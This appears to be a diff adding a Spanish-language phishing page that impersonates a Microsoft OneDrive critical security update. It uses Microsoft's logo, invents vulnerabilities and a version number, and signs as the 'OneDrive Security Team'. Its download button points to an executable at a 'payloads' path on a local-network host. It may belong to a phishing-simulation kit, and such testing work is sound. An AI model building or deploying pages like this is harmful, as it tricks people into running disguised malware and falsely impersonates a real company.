@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>OneDrive - Actualización de seguridad</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: #f3f2f1; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .container { max-width: 500px; background: white; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); padding: 40px; text-align: center; }
+        .logo { width: 100px; margin-bottom: 20px; }
+        h1 { color: #323130; font-size: 22px; margin-bottom: 12px; }
+        .warning { background: #fff4ce; border-left: 4px solid #ffc107; padding: 15px; margin: 20px 0; text-align: left; border-radius: 4px; }
+        .warning-icon { font-size: 20px; margin-right: 10px; }
+        p { color: #605e5c; line-height: 1.5; margin-bottom: 15px; }
+        .btn { background: #0078d4; color: white; border: none; padding: 14px 32px; border-radius: 4px; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; font-weight: 600; }
+        .btn:hover { background: #005a9e; }
+        .footer { margin-top: 25px; color: #a19f9d; font-size: 12px; }
+        .version { color: #0078d4; font-weight: 600; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <svg class="logo" viewBox="0 0 23 23">
+            <path fill="#0078d4" d="M1 1h10v10H1z"/>
+            <path fill="#00a4ef" d="M12 1h10v10H12z"/>
+            <path fill="#7fba00" d="M1 12h10v10H1z"/>
+            <path fill="#ffb900" d="M12 12h10v10H12z"/>
+        </svg>
+        
+        <h1>⚠️ Actualización de seguridad</h1>
+        
+        <div class="warning">
+            <span class="warning-icon">🔒</span>
+            <strong>OneDrive requiere una actualización crítica</strong><br>
+            Su versión actual tiene vulnerabilidades de seguridad conocidas. 
+            Instale la actualización para proteger sus archivos.
+        </div>
+        
+        <p>
+            Versión actual: <span style="text-decoration: line-through; color: #d83b01;">2.4.1.0</span><br>
+            Versión requerida: <span class="version">2.4.2.1 (Crítica)</span>
+        </p>
+        
+        <a href="http://192.168.1.6:8000/static/payloads/OneDrive_Update.exe" class="btn" download="OneDrive_Update.exe">
+            📥 Descargar actualización
+        </a>
+        
+        <p class="footer">
+            Publicado: 24 de julio de 2026<br>
+            Microsoft Corporation • OneDrive Security Team
+        </p>
+    </div>
+</body>
+</html>
